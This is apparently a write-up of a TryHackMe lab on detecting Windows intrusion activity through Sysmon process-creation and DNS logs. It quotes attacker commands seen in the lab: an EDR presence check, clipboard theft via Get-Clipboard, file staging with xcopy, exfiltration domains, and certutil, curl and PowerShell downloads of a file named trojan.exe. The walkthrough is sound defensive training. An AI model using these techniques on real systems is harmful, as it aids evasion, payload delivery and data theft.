<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Windows Threat Detection 2
|  Room Name | Windows Threat Detection 2 |
|----------|-------|
| Author | Dhruv Tripathi |
| Link | [Windows Threat Detection 2](https://tryhackme.com/room/windowsthreatdetection2) |

# Room Information
```bash Type: Walkthrough
Difficulty: Medium
Tags: - 
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Discover how to detect and analyze the first steps of threat actors after breaching Windows.
```
## Task 1

### Let's start!

- Answer: `No answer needed`

## Task 2

### Open CMD and type "net user Administrator". Which privileged group does the user belong to?

- We can run `net user Administrator` which shows information about the Windows account named `Administrator`. We can see below that they belong to the `Administrators` local group

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/c87a482a-fedb-45ac-ba01-94c8f921a549" />
</p>

- Answer: `Administrators`

### Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just run?

- Firstly, I had to go to `Applications and Services Logs` > `Microsoft` > `Windows` > `Sysmon` and then click on `Operational` to find the logs. Then I filtered for Sysmon Event ID `1` which searches for process creation. We target Event ID `1` because running a command-line tool like net triggers the system to launch a brand new executable process. Then, I looked through the logs as I had recently ran it and we can see the `Image` and our net command that we just ran

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f9cf105a-d54a-4964-896e-fe6f2b98dc83" />
</p>

- Answer: `C:\Windows\System32\net.exe`

## Task 3

### Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?

- We can go to the `Task 3` folder and run the `invoice.pdf.exe` binary

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/96c34b32-9388-4b60-97e8-fdabfa9e1e03" />
</p>

- We can filter for Sysmon Event ID `1` since we're looking for process creation events. Most of these discovery commands run as standalone processes, so Event ID `1` is the easiest way to catch them all in action

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/ff5525db-e860-4c76-93bf-4c43a10a564d" />
</p>

- Scrolling down we can see the that this log captures the initial execution of the malware, showing `invoice.pdf.exe` launching at `3:23:40 AM` with a unique `ProcessId` of `3392`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/c608e855-80f1-4e09-b007-b17e39e283ab" />
</p>

- Below, this log captures `whoami.exe` running as the very first discovery command spawned by the malware at `3:23:41 AM`. By looking at the details pane, we can verify it is directly tied to the initial process because its `ParentProcessId` is `3392`, which matches the `ProcessId` of the `invoice.pdf.exe` process that ran earlier

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/efa0e496-92c1-47d4-9767-c46c8de3bf87" />
</p>

- Answer: `whoami`

### Which command did the malware use to check the presence of MS Defender EDR?

- Going through the logs we find the command used to check the presence of MS Defender EDR

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/162448ff-7752-4e7d-a41b-967b5efa28ef" />
</p>

- Answer: `cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"`

### To which domain did the malware send the discovered data?

- We can filter for Sysmon Event ID `22` since it captures DNS queries. This lets us see exactly what external domains the malware is trying to communicate with or exfiltrate data to

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/af7f970e-6a68-429c-92ca-a6a545b0a0d3" />
</p>

- Answer: `exfil.beecz.cafe`

## Task 4

### What is the Facebook password that the user saved in Chrome? (Chrome menu > Passwords and autofill > Password Manager)

- We can open `Chrome` and then go to the `Chrome menu` (the 3 dots) > `Passwords and autofill` > `Google Password Manager`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/0a3ab696-220e-41a4-b477-595e84b7ebd1" />
</p>

- However whenever we click on the button to see the password, it requires the password for the admin account

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/eb38b5fe-c797-4323-b8b7-1e76a259397c" />
</p>

- Luckily for us TryHackMe gave us that password in the beginning

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/15a4a40c-e1f0-453b-aa52-444951d059ec" />
</p>

- Here we can see the password for facebook

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/eb0c12ad-5405-4fc3-ac6f-500d03dcfbed" />
</p>

- Answer: `nsAghv51BBav90!`

### Which interesting SSH key does the user store on disk? (Start your search from C:\Users\Administrator\)

- To find the SSH key we can navigate to `C:\Users\Administrator\.ssh\` and we can see there is one ending in `.pub` and `.key`. We pick the one ending in `.key` because it is the private key while the other one is publicly shared

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a529745a-8392-4461-8e7f-d8c8e664ab8c" />
</p>

- Answer: `thm-access-database.key`

### What is the secret PDF file explaining TryHackMe's internal network? (Look for the file on the Desktop, Downloads, and Documents)

- The name of the diagram is in `Downloads`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/950888a6-a1e6-4b20-8dcf-0e19b50be912" />
</p>

- Answer: `thm-network-diagram-2025.pdf`

## Task 5

### Looking at Sysmon logs, what directory does the stealer create?

- First thing to do is run `stealer.exe`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/1cefdb19-0ffd-4584-b338-a469ce2ecf7e" />
</p>

- We can filter for Sysmon Event ID `1` (Process Creation) to identify processes executed by `stealer.exe` and investigate its activity

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/7cab5586-3200-410d-8e31-dfcc8eb6e79f" />
</p>

- We can go through the logs and see that this one in particular captures a process creation event (Sysmon Event ID `1`) where `cmd.exe` was executed. The command ran a `mkdir` command to generate a new directory named `staging_58f1` within the system's environment defined `%temp%` folder
  
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a4eb552a-6d3f-48b5-acf1-6548a83bec79" />
</p>

- Answer: `staging_58f1`

### Which three file extensions does the malware search for? Format: Separate by comma in alphabetic order (e.g. bat, txt)

- Looking at this log we can see the actor used a `cmd.exe` wrapper (PID `6528`) with environment variables to dynamically copy all `.docx` files from the Desktop to a temporary staging folder

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/5e404654-3e4b-4feb-9659-bc73f5ed070f" />
</p>

- To go one step further we can see the actual `xcopy.exe` child process (PID `6544`) executing the copy operation with the environment variables fully expanded. The placeholders have been resolved into absolute file paths, specifically targeting the `Administrator` user profile and staging the files directly into the local hidden temporary directory

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/55c7651c-d499-4e56-91d1-9974d5bacac1" />
</p>

- Similar thing occurs with these processes below but instead it is a `.pdf` and `.xlsx` collection rule that collects all PDF files and Excel spreadsheets from the Desktop into the temporary directory

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/3aaa31ba-546f-4bfc-aa04-834a5b1781b1" />
</p>

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/abce51d7-c675-4f7c-b4af-8fa0984a9da0" />
</p>

- Answer: `docx, pdf, xlsx`

### Which PowerShell cmdlet does the malware use to get clipboard content?

- Here the logs shows the actor used PowerShell (PID `5360`) to steal the contents of the system clipboard. The command calls `Get-Clipboard` and redirects whatever text was currently copied into a new file named `clipboard.txt` inside the same temporary staging directory. This allows the attacker to grab potentially sensitive data like copied passwords, URLs, or notes

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/d1721339-73db-48e3-9459-3671a1ecbb2b" />
</p>

- Answer: `Get-Clipboard`

### Which domain does the malware exfiltrate the data to?

- We can use Sysmon Event ID `22` to observe any DNS queries being made. Here the malware (`stealer.exe`) performed a DNS lookup for an external Amazon S3 bucket

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/d7210047-6fba-4915-a36e-ed4a42c71018" />
</p>

- Answer: `collecteddata-storage-2025.s3.amazonaws.com`

## Task 6

### Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?

- We can navigate to the given URL and get the flag easily

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e6420ae2-f10f-4d28-ae32-710d01884e99" />
</p>

- Answer: `THM{just_use_web_browser}`

### Next, open CMD and download the file from the same URL using curl.exe. What is the flag in the response?

- Opening the command prompt and typing in `curl http://appsforfree.thm/trojan.exe` and we get the flag easily

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e60f7e84-258e-4241-a271-e7945ce1d1d8" />
</p>

- Answer: `THM{curl_is_cool}`

### Continue with the same CMD and URL, but now using certutil.exe. What is the flag in the response?

- Opening command prompt we can use the command `certutil -urlcache -f http://appsforfree.thm/trojan.exe` where `certutil` is a Windows tool, `-urlcache` uses its URL cache functionality, and `-f` forces the download

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/41b5daf3-8467-45df-9dfa-9db4ce7cd5cd" />
</p>

- Answer: `THM{abusing_certutil}`

### Finally, download the same file using PowerShell IWR. What is the flag in the response?

- This time we run powershell instead of command prompt using the command `powershell -c "Invoke-WebRequest" -Uri 'http://appsforfree.thm/trojan.exe'` where `powershell` runs Windows PowerShell, `-c` tells it to execute a command, `Invoke-WebRequest` sends a web request, and `-Uri` specifies the URL to access

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/84961de7-9109-439b-9b11-401473acdd8e" />
</p>

- Answer: `THM{power_of_powershell}`

## Skills Learned

- Analyzed Windows user accounts and identified privileged group memberships using the `net user` command
- Navigated Windows Event Viewer to investigate Sysmon operational logs and identify suspicious activity
- Used Sysmon Event ID `1` to track process creation, analyze command-line arguments, and establish parent-child process relationships
- Used Sysmon Event ID `22` to identify DNS queries and investigate potential command-and-control communications and data exfiltration
- Identified malware discovery techniques, including gathering user information with `whoami` and checking for Microsoft Defender for Endpoint using `tasklist` and `findstr`
- Investigated information-stealing malware by tracing its execution, file system activity, and data collection behavior
- Identified sensitive information stored on a compromised Windows system, including browser-saved credentials, private SSH keys, and confidential documents
- Detected file collection and staging techniques involving temporary directories and file extensions such as `.docx`, `.pdf`, and `.xlsx`
- Recognized clipboard collection techniques using the PowerShell `Get-Clipboard` cmdlet
- Investigated potential data exfiltration by identifying external domains associated with malware activity, including Amazon S3 endpoints
- Compared different file download techniques using a web browser, `curl.exe`, `certutil.exe`, and PowerShell's `Invoke-WebRequest`
- Improved the ability to correlate process creation events, command-line activity, and DNS queries to reconstruct suspicious behavior and understand the stages of a Windows malware attack

## Conclusion

This room provided valuable hands-on experience in understanding how threat actors operate within Windows environments and how their activities can be detected through system logs and monitoring tools. It helped strengthen my knowledge of threat detection, log analysis, and identifying suspicious behavior. I also gained a better understanding of how important it is to investigate unusual activity and recognize potential security risks. Overall, this room improved my understanding of Windows security and the role of monitoring and investigation in detecting and responding to cyber threats
